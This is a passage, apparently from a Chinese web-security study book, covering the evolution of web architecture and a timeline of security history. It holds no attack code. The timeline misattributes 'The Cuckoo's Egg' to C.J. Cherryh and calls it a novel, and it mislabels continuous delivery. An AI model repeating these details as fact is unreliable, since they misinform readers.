<span>+</span>–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>––––––––––—<span>+</span>––––––––––––––––––––––––––––––––––––––––––––––—<span>+</span>–––—<span>+</span></li></ol><blockquote><p><a href='#sqlmap-使用'><span>11.5 SQLMap 使用</span></a><span> 374</span></p><p><a href='#_bookmark114'><strong><span>12 其他</span></strong></a><span> </span><strong><span>377</span></strong></p><p><a href='#代码审计'><span>12.1 代码审计</span></a><span> 377</span></p><p><a href='#waf-1'><span>12.2 WAF</span></a><span> 381</span></p><p><a href='#常见网络设备'><span>12.3 常见网络设备</span></a><span> 385</span></p><p><a href='#指纹-1'><span>12.4 指纹</span></a><span> 389</span></p></blockquote><ol start='5' ><li><a href='#unicode'><span>Unicode</span></a><span> 390</span></li><li><a href='#json'><span>JSON</span></a><span> 396</span></li><li><a href='#拒绝服务攻击-1'><span>拒绝服务攻击</span></a><span> 397</span></li><li><a href='#邮件安全'><span>邮件安全</span></a><span> 399</span></li></ol><blockquote><p><a href='#apt-1'><span>12.9 APT</span></a><span> 399</span></p></blockquote><ol start='10' ><li><a href='#供应链安全-2'><span>供应链安全</span></a><span> 402</span></li><li><a href='#近源渗透-1'><span>近源渗透</span></a><span> 402</span></li><li><a href='#常见术语'><span>常见术语</span></a><span> 404</span></li></ol><p><span id="_bookmark0" class="anchor"></span><span>CHAPTER 1</span></p><h1 id='1--序章'><span>1.  序章</span></h1><h2 id='11--web-技术演化'><span>1.1  Web 技术演化</span></h2><p><span>1.1.1  简单网站</span></p><h4 id='静态页面'><span>静态页面</span></h4><p><span>Web 技术在最初阶段，网站的主要内容是静态的，大多站点托管在 ISP (网络服务供应商)上，由文字和图片组成，制作和表现形式也是以表格为主。当时的用户行为也非常简单，基本只是浏览网页。</span></p><h4 id='多媒体阶段'><span>多媒体阶段</span></h4><p><span>随着技术的不断发展，音频、视频、Flash 等多媒体技术诞生了。多媒体的加入使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。</span></p><h4 id='cgi-阶段'><span>CGI 阶段</span></h4><p><span>渐渐的，多媒体已经不能满足人们的请求，于是 CGI (Common Gateway Interface) 应运而生。</span><strong><span>CGI 定义了 Web 服务器与外部应用程序之间的通信接口标准，因此 Web 服务器可以通过 CGI 执行外部程序，让外部程序根据 Web 请求内容生成动态的内容。</span></strong><span>在这个时候，各种编程语言如 PHP/ASP/JSP 也逐渐加入市场，基于这些语言可以实现更加模块化的、功能更强大的应用程序。</span></p><h4 id='mvc'><span>MVC</span></h4><p><span>随着 Web 应用开发越来越标准化，出现了 MVC 等思想。MVC 是 Model/View/Control 的缩写，Model用于封装数据和数据处理方法，视图 View 是数据的 HTML 展现，控制器 Controller 负责响应请求，协调 Model 和 View。</span></p><p><span>Model，View 和 Controller 的分开，是一种典型的</span><strong><span>关注点分离</span></strong><span>的思想，使得代码复用性和组织性更好，Web应用的配置性和灵活性也越来越好。而数据访问也逐渐通过面向对象的方式来替代直接的 SQL 访问，出现了 ORM (Object Relation Mapping) 的概念。</span></p><p><span>除了 MVC，类似的设计思想还有 MVP、MVVM 等。</span></p><h3 id='112--数据交互'><span>1.1.2  数据交互</span></h3><h4 id='简单数据交互'><span>简单数据交互</span></h4><p><span>在 Web 技术发展最初，前后端交互大部分都使用 Web 表单、XML、SOAP 等较为简单的方式。</span></p><h4 id='ajax'><span>Ajax</span></h4><p><span>在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是 Ajax (Asynchronous Javascript And XML) 技术逐渐流行起来，</span><strong><span>它使得应用在不更新整个页面的前提下也可以获得或更新数据</span></strong><span>。这使得 Web应用程序</span><strong><span>更为迅捷地回应用户动作，并避免了在网络上发送那些没有改变的信息</span></strong><span>。</span></p><h4 id='restful'><span>RESTful</span></h4><p><span>在 CGI 时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。</span><strong><span>前端</span></strong><span>主要指网站前台部分，运行在 PC 端、移动端等浏览器上展现给用户浏览的网页，由 HTML5、CSS3、 JavaScript 组成。</span><strong><span>后端</span></strong><span>主要指网站的逻辑部分，涉及数据的增删改查等。</span></p><p><span>此时，REST (Representation State Transformation) 逐渐成为一种流行的 Web 架构风格。</span></p><p><span>REST 鼓励基于 URL 来组织系统功能，充分利用 HTTP 本身的语义，而不是仅仅将 HTTP 作为一种远程数据传输协议。一般 RESTful 有以下的特征：</span></p><ul><li><h6 id='域名和主域名分开'><span>域名和主域名分开</span></h6><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; api.example.com</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; example.com/api/</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul></li><li><h6 id='带有版本控制'><span>带有版本控制</span></h6><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="http"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">- &nbsp; api.example.com/v1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; api.example.com/v2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul></li><li><h6 id='使用-url-定位资源'><span>使用 URL 定位资源</span></h6><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; GET /users 获取所有用户</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; GET /team/:team/users 获取某团队所有用户</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; POST /users 创建用户</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; PATCH/PUT /users 修改某个用户数据</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; DELETE /users 删除某个用户数据</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul></li><li><h6 id='用-http-动词描述操作'><span>用 HTTP 动词描述操作</span></h6><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; GET 获取资源，单个或多个</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; POST 创建资源</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; PUT/PATCH 更新资源，客户端提供完整的资源数据</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- &nbsp; DELETE 删除资源</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 159px;"></div><div class="CodeMirror-gutters" style="height: 159px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul></li><li><h6 id='正确使用状态码'><span>正确使用状态码</span></h6><ul><li><span>使用状态码提高返回数据的可读性</span></li></ul></li><li><h6 id='默认使用-json-作为数据响应格式'><span>默认使用 JSON 作为数据响应格式</span></h6></li><li><h6 id='有清晰的文档'><span>有清晰的文档</span></h6></li></ul><h4 id='graphql'><span>GraphQL</span></h4><blockquote><p><span>部分网络服务场景的数据有复杂的依赖关系，为了应对这些场景，Facebook 推出了 GraphQL ，以图状数据结构对数据进行查询存储。部分网站也应用了 GraphQL 作为 API 交互的方式。</span></p></blockquote><h4 id='二进制'><span>二进制</span></h4><blockquote><p><span>随着业务对性能的要求提高，前后端开始使用 HTTP/2、自定义 Protocol Buffer 等方式来加快数据交互。</span></p></blockquote><h3 id='113--架构演进'><span>1.1.3  架构演进</span></h3><blockquote><p><span>随着业务的不断发展，业务架构也越来越复杂。传统的功能被拆分成不同的模块，出现了中间件、中台等概念。代理服务、负载均衡、数据库分表、异地容灾、缓存、CDN、消息队列、安全防护等技术应用越来越广泛，增加了 Web 开发和运维的复杂度。</span></p><p><span>客户端的形态越来越多，除了 Web 之外 iOS、Android 等其他场景也出现在 Web 服务的客户端场景。</span></p><p><span>较早的关系型数据库 </span><strong><span>MySQL</span></strong><span>、PostgreSQL 等已经不能满足需求，出现了 </span><strong><span>Redis</span></strong><span>/Memcached 缓存数据库等一类满足特定需求的数据库。</span></p><p><span>为了满足特定的业务需求，出现了 Lucene/Solr/Elasticsearch 搜索应用服务器，Kafka/RabbitMQ/ZeroMQ消息系统，Spark 计算引擎，Hive 数据仓库平台等不同的基础架构。</span></p></blockquote><h4 id='中间件'><span>中间件</span></h4><blockquote><p><span>中间件是独立的软件程序，用于管理计算资源和网络通信。常用的</span><strong><span>功能</span></strong><span>有过滤 IP、合并接口、合并端口、路由、权限校验、负载均衡、反向代理等。</span></p></blockquote><h4 id='分布式'><span>分布式</span></h4><blockquote><p><span>随着数据量的不断提高，单台设备难以承载这样的访问量，同时不同功能也被拆分到不同的应用中，于是出现了提高业务复用及整合的分布式服务框架 (RPC)。</span></p></blockquote><h3 id='114--云服务'><span>1.1.4  云服务</span></h3><blockquote><p><span>云计算诞生之前，大部分计算资源是处于</span>“<span>裸金属</span>”<span>状态的物理机，运维人员选择对应规格的硬件，建设机房的 IDC 网络，完成服务的提供，投入硬件基础建设和维护的成本很高。云服务出现之后，使用者可以直接购买云主机，基础设施由供应商管理，这种方式也被称作 IaaS (Infrastructure-as-a-Service) 。</span></p><p><span>随着架构的继续发展，应用的运行更加细粒度，部署环境容器化，各个功能拆成微服务或是 Serverless 的架构。</span></p></blockquote><h4 id='serverless'><span>Serverless</span></h4><blockquote><p><span>Serverless 架构由两部分组成，即 Faas (Function-as-a-Service) 和 BaaS (Backend-as-a-Service) 。</span></p><p><span>FaaS 是运行平台，用户上传需要执行的逻辑函数如一些定时任务、数据处理任务等到云函数平台，配置执行条件触发器、路由等等，就可以通过云平台完成函数的执行。</span></p><p><span>BaaS 包含了后端服务组件，它基于 API 完成第三方服务，主要是数据库、对象存储、消息队列、日志服务等等。</span></p></blockquote><h4 id='微服务'><span>微服务</span></h4><blockquote><p><span>微服务起源于 2005 年 Peter Rodgers 博士在云端运算博览会提出的微 Web 服务 (Micro-Web-Service)，根本思想类似于 Unix 的管道设计理念。2014 年，由 Martin Fowler 与 James Lewis 共同提出了微服务的概念，定义了微服务架构风格是一种通过一套小型服务来开发单个应用的方法，每个服务运行在自己的进程中，并通过轻量级的机制进行通讯 (HTTP API) 。</span></p><p><span>微服务是一种应用于组件设计和部署架构的软件架构风格。它利用模块化的方式组合出复杂的大型应用程序：</span></p></blockquote><ul><li><span>各个服务功能内聚，实现与接口分离。</span></li><li><span>各个服务高度自治、相互解耦，可以独立进行部署、版本控制和容量伸缩。</span></li><li><span>各个服务之间通过 API 的方式进行通信。</span></li><li><span>各个服务拥有独立的状态，并且只能通过服务本身来对其进行访问。</span></li></ul><blockquote><p><span>随着微服务技术的不断发展，这种思想也被应用到了前端。2018 年，第一个微前端工具 single-spa 出现在</span></p><p><span>github。而后出现了基于 single-spa 的框架 qiankun。</span></p></blockquote><h4 id='api-网关'><span>API 网关</span></h4><blockquote><p><span>API 网关是一个服务器，客户端只需要使用简单的访问方式，统一访问 API 网关，由 API 网关来代理对后端服务的访问，同时由于服务治理特性统一放到 API 网关上面，服务治理特性的变更可以做到对客户端透明，一定程度上实现了服务治理等基础特性和业务服务的解耦，服务治理特性的升级也比较容易实现。</span></p></blockquote><h3 id='115--软件开发'><span>1.1.5  软件开发</span></h3><h4 id='cicd'><span>CI/CD</span></h4><blockquote><p><span>持续集成 (Continuous Integration, CI) 是让开发人员将工作集成到共享分支中的过程。频繁的集成有助于解决隔离，减少每次提交的大小，以降低合并冲突的可能性。</span></p><p><span>持续交付 (Continuous Deployment, CD) 是持续集成的扩展，它将构建从集成测试套件部署到预生产环境。这使得它可以直接在类生产环境中评估每个构建，因此开发人员可以在无需增加任何工作量的情况下，验证 bug 修复或者测试新特性。</span></p></blockquote><h3 id='116--参考链接'><span>1.1.6  参考链接</span></h3><ul><li><a href='https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/'><span>Scaling webapps for newbs</span></a></li><li><a href='https://learnku.com/articles/24050'><span>GitHub 的 Restful HTTP API 设计分解</span></a></li></ul><p>&nbsp;</p><h2 id='12--网络攻防技术演化'><span>1.2  网络攻防技术演化</span></h2><h3 id='121--历史发展'><span>1.2.1  历史发展</span></h3><blockquote><p><span>1939 年，图灵破解了 Enigma，使战争提前结束了两年，这是较早的一次计算机安全开始出现在人们的视野中，这个时候计算机的算力有限，人们使用的攻防方式也相对初级。</span></p><p><span>1949 年，约翰·冯·诺依曼（John Von Neumann）提出了一种可自我复制的程序的设计，这被认为是世界上第一种计算机病毒。</span></p><p><span>1970 年到 2009 年间，随着因特网不断发展，网络安全也开始进入人们的视野。在网络发展的初期，很多系统都是零防护的，安全意识也尚未普及开来。很多系统的设计也只考虑了可用性，对安全性的考虑不多，所以在当时结合搜索引擎与一些集成渗透测试工具，可以很容易的拿到数据或者权限。</span></p><p><span>1972 年，缓冲区溢出攻击被 Computer Security Technology Planning Study 提出。</span></p><p><span>1984 年，Ken Thompson 在 Reflections on Trusting Trust 一文中介绍了自己如何在编译器中增加后门来获取 Unix 权限的，这也是较早的供应链攻击。</span></p><p><span>1988 年，卡耐基梅隆大学 (Carnegie Mellon University, CMU) 的一位学生以测试的目的编写了Morris Worm，对当时的互联网造成了极大的损害。</span></p><p><span>同年，CMU 的 CERT Coordination Center (CERT-CC) 为了处理 Morris Worm 对互联网造成的破坏，组成了第一个计算机紧急响应小组 (Computer Emergency Response Team)，而后全球多个国家、地区、团体都构建了 CERT、SRC 等组织。</span></p><p><span>同样是在 1988 年，Barton Miller 教授在威斯康星大学的 </span><a href='http://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf'><span>计算机实验课上</span></a><span> ，首次提出 Fuzz 生成器 (Fuzz Generator) 的概念，用于测试 Unix 程序的健壮性，即用随机数据来测试程序直至崩溃。因此，Barton Miller教授也被多数人尊称为</span>”<span> 模糊测试之父</span>“<span>。</span></p><p><span>1989 年，C.J.Cherryh 发表了小说 The Cuckoo</span>’<span>s Egg: Tracking a Spy Through the Maze of Computer Espionage ，这本书是作者根据追溯黑客攻击的真实经历改编，在书中提出了蜜罐技术的雏形。</span></p><p><span>1990 年，一些网络防火墙的产品开始出现，此时主要是基于网络的防火墙，可以处理 FTP 等应用程序。</span></p><p><span>1993 年起，Jeff Moss 开始每年在美国内华达州的拉斯维加斯举办 DEFCON (也写做 DEF CON, Defcon, or DC, 全球最大的计算机安全会议之一) 。CTF (Capture The Flag) 比赛的形式也是起源于 1996 年的 DEFCON 。</span></p><p><span>1993 年 7 月，Windows NT 3.1 发布，引入了身份认证、访问控制和安全审计等安全控制机制，在此之前的Windows 9x 内核几乎没有任何安全性机制。</span></p><p><span>1996 年，Smashing the Stack For Fun and Profit 发表，在堆栈的缓冲区溢出的利用方式上做出了开创性的工作。</span></p><p><span>1997 年起，Jeff Moss 开始举办 Black Hat ，以中立的立场进行信息安全研究的交流和培训，到目前为止，Black Hat 也会在欧洲和亚洲举行。</span></p><p><span>1998 年 12 月，Jeff Forristal 在一篇 </span><a href='http://www.phrack.com/issues.html?issue=54&amp;id=8'><span>文章</span></a><span> 中提到了使用 SQL 注入的技巧攻击一个网站的例子，从此 SQL注入开始被广泛讨论。</span></p><p><span>1999 年 1 月 21 日-22 日的第二届 Research with Security Vulnerability Databases 的 WorkShop 上，MITRE的创始人 David E. Mann 和 Steven M. Christey 发表了一篇名为《Towards a Common Enumeration of Vulnerabilities》的白皮书，提出了 CVE (Common Vulnerabilities and Exposures, </span><strong><span>通用漏洞披露</span></strong><span>) 的概念，在当年收录并公开了 321 个 CVE 漏洞。</span></p><p><span>1999 年 12 月，MSRC 的一些工程师发现了一些网站被注入代码的例子，他们在整理讨论后公开了这种攻击，并称为 Cross Site Scripting。</span></p><p><span>2002 年 1 月，Microsoft 发起了</span>“<span>可信赖计算</span>”<span>(Trustworthy Computing) 计划，以帮助确保产品和服务在本质上具有高度安全性，可用性，可靠性以及业务完整性，SDL (Security Development Lifecycle) 也在此时被提出。</span></p><p><span>2001 年 9 月 9 日，Mark Curphey 启动了 OWASP (Open Web Application Security Project) 项目，开始在社区中提供一些 Web 攻击技术的文章、方法和工具等。</span></p><p><span>在此之后，Responsible disclosure / Full disclosure 等概念也不断进入人们的视野之中。</span></p><p><span>2002 年 10 月 4 日，Kevin Mitnick 编著的 The Art of Deception (欺骗的艺术) 出版，这本书详细的介绍了社会工程学在攻击中是如何应用的，Kevin Mitnick 也被认为是社会工程学的开山鼻祖。</span></p><p><span>2005 年 7 月 25 日，Zero Day Initiative (ZDI) 创建，鼓励负责任的漏洞披露。</span></p><p><span>2005 年 11 月，基于从 1941 年 2 月开始的情报收集积累和发展，Director of National Intelligence 宣布成立 Open Source Center (OSC) ，进行开源情报的收集，而后 Open-source intelligence (OSINT) 的概念也不断被人们认知。</span></p><p><span>2006 年，APT(Advanced Persistent Threat, 高级持续威胁) 攻击的概念被正式提出，用来描述从 20 世纪 90</span></p><p><span>年代末到 21 世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。</span></p><p><span>2006 年起，美国国土安全部（DHS）开始每两年举行一次</span>“<span>网络风暴</span>”<span>(Cyber Storm) 系列国家级网络事件演习。</span></p><p><span>随着时代不断的发展，攻防技术有了很大的改变，防御手段、安全意识也随着演化。在攻击发生前有威胁情报、黑名单共享等机制，威胁及时能传播。在攻击发生时有基于各种机制的防火墙如关键字检测、语义分析、深度学习，有的防御机制甚至能一定程度上防御零日攻击。在攻击发生后，一些关键系统系统做了隔离，攻击成果难以扩大，就算拿到了目标也很难做进一步的攻击。也有的目标蜜罐仿真程度很高，有正常的服务和一些难以判断真假的业务数据。</span></p><p><span>2010 年 6 月，震网 (Stuxnet) 被发现，在这之后供应链攻击事件开始成为网络空间安全的新兴威胁之一。随后的 XcodeGhost、CCleaner 等供应链攻击事件都造成了重大影响。</span></p><p><span>在 2010 年 Forrester Research Inc. 的分析师提出了</span>“<span>零信任</span>”<span>的概念模型时。</span></p><p><span>2012 年 1 月，Gartner 公司提出了 IAST (Interactive Application Security Testing) 的概念，提供了结合 DAST 和 SAST 两种技术的解决方案。这种方式漏洞检出率高、误报率低，同时可以定位到 API 接口和代码片段。</span></p><p><span>2012 年 9 月，Gartner 公司研究员 David Cearley 提出了 DevSecOps 的概念，表示 DevOps 的流程应该包含安全理念。</span></p><p><span>2013 年，MITRE 提出了ATT&amp;CK™ (Adversarial Tactics, 